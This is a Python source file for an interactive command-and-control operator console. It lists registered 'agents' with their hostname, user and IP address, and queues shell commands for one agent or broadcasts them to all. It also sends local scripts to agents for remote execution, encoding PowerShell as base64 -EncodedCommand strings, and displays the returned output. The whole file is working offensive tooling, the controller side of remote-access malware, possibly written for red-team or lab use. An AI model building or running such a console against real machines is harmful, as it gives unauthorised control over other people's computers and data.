import cmd
import sys
import time
import shlex
import os
from typing import Optional
import requests

# Reconfigure stdout for utf-8 on Windows
if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich import print as rprint
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

console = Console(legacy_windows=False) if HAS_RICH else None
DEFAULT_SERVER = os.getenv("C2_SERVER_URL", "http://127.0.0.1:8000")


BANNER = r"""
======================================================================
  ____ ___    ____                                           _ 
 / ___|__ \  / ___|___  _ __ ___  _ __ ___   __ _ _ __   __| |
| |     / / | |   / _ \| '_ ` _ \| '_ ` _ \ / _` | '_ \ / _` |
| |___ / /_ | |__| (_) | | | | | | | | | | | (_| | | | | (_| |
 \____|____| \____\___/|_| |_| |_|_| |_| |_|\__,_|_| |_|\__,_|
                 TERMINAL OPERATOR CONSOLE
======================================================================
"""


class C2InteractiveConsole(cmd.Cmd):
    intro = BANNER + f"\nConnected to C2 Server at: {DEFAULT_SERVER}\nType 'help' or '?' to view available commands.\n"
    prompt = "c2 > "

    def __init__(self, server_url: str = DEFAULT_SERVER):
        super().__init__()
        self.server_url = server_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({"Connection": "close"})
        self.active_agent_id: Optional[str] = None

    def _api_get(self, path: str, params=None):
        try:
            r = self.session.get(f"{self.server_url}{path}", params=params, timeout=5)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            self._print_error(f"API Error: {e}")
            return None

    def _api_post(self, path: str, json_data=None):
        try:
            r = self.session.post(f"{self.server_url}{path}", json=json_data, timeout=5)
            r.raise_for_status()
            return r.json()
        except Exception as e:
            self._print_error(f"API Error: {e}")
            return None

    def _print_error(self, msg: str):
        if HAS_RICH:
            rprint(f"[bold red][!] {msg}[/bold red]")
        else:
            print(f"[!] {msg}")

    def _print_success(self, msg: str):
        if HAS_RICH:
            rprint(f"[bold green][+] {msg}[/bold green]")
        else:
            print(f"[+] {msg}")

    def _wait_and_print_task(self, task_id: str, timeout: int = 40):
        print("Waiting for agent check-in and execution...", end="", flush=True)
        start = time.time()
        while time.time() - start < timeout:
            time.sleep(1)
            t = self._api_get(f"/api/tasks/{task_id}")
            if not t:
                continue

            status = t.get("status")
            if status in ("completed", "failed"):
                print("")
                st_color = "green" if status == "completed" else "red"
                exit_code = t.get("exit_code")

                if HAS_RICH:
                    console.print(f"[bold {st_color}]Task {status.upper()}[/bold {st_color}] (Exit Code: {exit_code})")
                    if t.get("stdout"):
                        console.print(Panel(t.get("stdout").rstrip(), title="[cyan]stdout[/cyan]", border_style="green"))
                    if t.get("stderr"):
                        console.print(Panel(t.get("stderr").rstrip(), title="[red]stderr[/red]", border_style="red"))
                    if t.get("error_message"):
                        console.print(f"[bold red]Error:[/] {t.get('error_message')}")
                else:
                    print(f"Task {status.upper()} (Exit Code: {exit_code})")
                    if t.get("stdout"):
                        print(t.get("stdout"))
                    if t.get("stderr"):
                        print(f"[stderr]: {t.get('stderr')}")
                    if t.get("error_message"):
                        print(f"[error]: {t.get('error_message')}")
                return
            elif status == "dispatched":
                print(">", end="", flush=True)
            else:
                print(".", end="", flush=True)

        print(f"\n[!] Timeout waiting for task {task_id}. It will execute on the next check-in.")

    # ----------------- Commands -----------------

    def do_agents(self, arg):
        """List all registered agents and their current status.\nUsage: agents"""
        agents = self._api_get("/api/agents")
        if agents is None:
            return

        if not agents:
            print("No agents currently registered.")
            return

        if HAS_RICH:
            table = Table(title="Connected Agents")
            table.add_column("Status", justify="center")
            table.add_column("Agent ID", style="bold yellow")
            table.add_column("Hostname")
            table.add_column("User")
            table.add_column("OS / Arch")
            table.add_column("IP Address")
            table.add_column("Last Seen")

            for a in agents:
                status_badge = "[green]ONLINE[/green]" if a.get("is_online") else "[red]OFFLINE[/red]"
                os_str = f"{a.get('os_name', '')} ({a.get('arch', '')})"
                table.add_row(
                    status_badge,
                    a.get("agent_id", ""),
                    a.get("hostname", ""),
                    a.get("username", ""),
                    os_str,
                    a.get("ip_address", ""),
                    a.get("last_seen", "")[:19]
                )
            console.print(table)
        else:
            print(f"{'STATUS':<10} {'AGENT ID':<22} {'HOSTNAME':<15} {'IP':<16} {'OS':<14} {'LAST SEEN'}")
            print("-" * 92)
            for a in agents:
                st = "ONLINE" if a.get("is_online") else "OFFLINE"
                print(f"{st:<10} {a.get('agent_id'):<22} {a.get('hostname'):<15} {a.get('ip_address'):<16} {a.get('os_name'):<14} {a.get('last_seen')[:19]}")

    def do_interact(self, arg):
        """Enter interactive session mode for a specific agent.\nUsage: interact <agent_id>"""
        agent_id = arg.strip()
        if not agent_id:
            self._print_error("Please specify an agent ID. Usage: interact <agent_id>")
            return

        agent = self._api_get(f"/api/agents/{agent_id}")
        if not agent:
            self._print_error(f"Agent '{agent_id}' not found.")
            return

        self.active_agent_id = agent_id
        self.prompt = f"c2 [{agent_id}] > "
        self._print_success(f"Interacting with [{agent_id}] ({agent.get('hostname')} - {agent.get('os_name')}). Type shell commands directly. Type 'back' to exit session.")

    def do_back(self, arg):
        """Exit the current agent session and return to main C2 prompt.\nUsage: back"""
        self.active_agent_id = None
        self.prompt = "c2 > "
        print("Returned to main console.")

    def do_exec(self, arg):
        """Queue a command for an agent and wait for output.\nUsage: exec <agent_id> <command>"""
        parts = arg.strip().split(maxsplit=1)
        if len(parts) < 2:
            self._print_error("Usage: exec <agent_id> <command>")
            return
        agent_id, cmd_str = parts[0], parts[1]
        self._queue_and_run(agent_id, cmd_str)

    def do_script(self, arg):
        """Execute a local script file (.ps1, .sh, .bat) on an agent.\nUsage: script <agent_id> <path/to/script>"""
        parts = arg.strip().split(maxsplit=1)
        if len(parts) < 2:
            if self.active_agent_id and len(parts) == 1:
                agent_id = self.active_agent_id
                filepath = parts[0]
            else:
                self._print_error("Usage: script <agent_id> <filepath>")
                return
        else:
            agent_id, filepath = parts[0], parts[1]

        if not os.path.exists(filepath):
            self._print_error(f"Script file '{filepath}' not found.")
            return

        try:
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
        except Exception as e:
            self._print_error(f"Error reading file: {e}")
            return

        if filepath.endswith(".ps1"):
            import base64
            encoded = base64.b64encode(content.encode("utf-16le")).decode("ascii")
            final_cmd = f"powershell.exe -NoProfile -NonInteractive -EncodedCommand {encoded}"
        else:
            final_cmd = content

        self._print_success(f"Loaded script '{filepath}' ({len(content)} bytes). Queueing for agent...")
        self._queue_and_run(agent_id, final_cmd)

    def do_broadcast(self, arg):
        """Queue a command to run across ALL agents.\nUsage: broadcast <command>"""
        cmd_str = arg.strip()
        if not cmd_str:
            self._print_error("Usage: broadcast <command>")
            return
        res = self._api_post("/api/tasks", {"agent_id": "all", "command": cmd_str})
        if res:
            self._print_success(f"Broadcast queued for {res.get('count', 0)} agents.")

    def do_tasks(self, arg):
        """List tasks.\nUsage: tasks [agent_id]"""
        params = {}
        if arg.strip():
            params["agent_id"] = arg.strip()
        tasks = self._api_get("/api/tasks", params=params)
        if not tasks:
            print("No tasks found.")
            return

        if HAS_RICH:
            table = Table(title="Task History")
            table.add_column("Task ID", style="bold yellow")
            table.add_column("Agent ID", style="cyan")
            table.add_column("Status")
            table.add_column("Exit", justify="center")
            table.add_column("Command")
            table.add_column("Queued At")

            for t in tasks:
                st = t.get("status", "")
                st_color = "green" if st == "completed" else ("yellow" if st == "pending" else ("blue" if st == "dispatched" else "red"))
                table.add_row(
                    t.get("id")[:8],
                    t.get("agent_id")[:12],
                    f"[{st_color}]{st}[/{st_color}]",
                    str(t.get("exit_code") if t.get("exit_code") is not None else "-"),
                    t.get("command")[:35],
                    t.get("created_at")[:19]
                )
            console.print(table)
        else:
            print(f"{'TASK ID':<10} {'AGENT':<15} {'STATUS':<12} {'EXIT':<6} {'COMMAND'}")
            print("-" * 75)
            for t in tasks:
                exit_code = str(t.get("exit_code")) if t.get("exit_code") is not None else "-"
                print(f"{t.get('id')[:8]:<10} {t.get('agent_id')[:12]:<15} {t.get('status'):<12} {exit_code:<6} {t.get('command')}")

    def do_output(self, arg):
        """View full output of a task.\nUsage: output <task_id>"""
        task_id = arg.strip()
        if not task_id:
            self._print_error("Usage: output <task_id>")
            return
        t = self._api_get(f"/api/tasks/{task_id}")
        if not t:
            self._print_error("Task not found.")
            return

        if HAS_RICH:
            st_color = "green" if t.get("status") == "completed" else "red"
            header = f"[bold]Task:[/] {t.get('id')}\n[bold]Agent:[/] {t.get('agent_id')}\n[bold]Command:[/] {t.get('command')}\n[bold]Status:[/] [{st_color}]{t.get('status')}[/{st_color}] (exit: {t.get('exit_code')})"
            console.print(Panel(header, title="Task Details", border_style="cyan"))
            if t.get("stdout"):
                console.print(Panel(t.get("stdout"), title="Standard Output", border_style="green"))
            if t.get("stderr"):
                console.print(Panel(t.get("stderr"), title="Standard Error", border_style="red"))
            if t.get("error_message"):
                console.print(f"[bold red]System Error:[/] {t.get('error_message')}")
        else:
            print(f"Task ID: {t.get('id')} | Agent: {t.get('agent_id')} | Status: {t.get('status')}")
            print("--- stdout ---")
            print(t.get("stdout") or "(none)")
            if t.get("stderr"):
                print("--- stderr ---")
                print(t.get("stderr"))

    def do_stats(self, arg):
        """Show server statistics.\nUsage: stats"""
        s = self._api_get("/api/stats")
        if s:
            if HAS_RICH:
                table = Table(title="C2 Server Statistics")
                table.add_column("Metric", style="cyan")
                table.add_column("Value", style="bold green")
                table.add_row("Total Agents", str(s.get("total_agents", 0)))
                table.add_row("Online Agents", str(s.get("online_agents", 0)))
                table.add_row("Offline Agents", str(s.get("offline_agents", 0)))
                table.add_row("Pending Tasks", str(s.get("tasks_pending", 0)))
                table.add_row("Dispatched Tasks", str(s.get("tasks_dispatched", 0)))
                table.add_row("Completed Tasks", str(s.get("tasks_completed", 0)))
                table.add_row("Failed Tasks", str(s.get("tasks_failed", 0)))
                table.add_row("Total Tasks", str(s.get("total_tasks", 0)))
                console.print(table)
            else:
                for k, v in s.items():
                    print(f"{k}: {v}")

    def do_clear(self, arg):
        """Clear the console screen.\nUsage: clear"""
        os.system("cls" if os.name == "nt" else "clear")

    def do_exit(self, arg):
        """Exit the C2 operator console.\nUsage: exit"""
        print("Goodbye.")
        return True

    def do_quit(self, arg):
        """Exit the C2 operator console.\nUsage: quit"""
        return self.do_exit(arg)

    def default(self, line):
        """If inside an active agent session, treat unknown input as a command for that agent!"""
        if self.active_agent_id:
            cmd_str = line.strip()
            if cmd_str:
                self._queue_and_run(self.active_agent_id, cmd_str)
        else:
            self._print_error(f"Unknown command: '{line}'. Type 'help' for available commands.")

    def _queue_and_run(self, agent_id: str, cmd_str: str):
        res = self._api_post("/api/tasks", {"agent_id": agent_id, "command": cmd_str})
        if not res or not res.get("tasks"):
            return
        task_id = res["tasks"][0]["id"]
        self._wait_and_print_task(task_id)


def main():
    server = os.getenv("C2_SERVER_URL", DEFAULT_SERVER)
    if len(sys.argv) > 1:
        server = sys.argv[1]
    console_app = C2InteractiveConsole(server_url=server)
    try:
        console_app.cmdloop()
    except KeyboardInterrupt:
        print("\n[!] Console interrupted. Exiting.")


if __name__ == "__main__":
    main()
